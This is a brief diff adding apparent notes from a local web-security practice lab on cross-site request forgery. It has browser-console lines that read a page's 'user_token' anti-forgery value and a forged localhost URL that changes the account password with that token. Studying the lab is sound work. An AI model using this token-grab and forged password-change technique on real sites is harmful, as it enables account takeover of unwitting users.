@@ -1,0 +1,5 @@
+console.log(document.getElementsByName('user_token')[0])
+document.getElementsByName('user_token')[0].value
+
+
+http://localhost/vulnerabilities/csrf/index.php?password_new=password&password_conf=password&Change=Change&user_token=9b7bbbb6bb0a4945c289617164155c26#
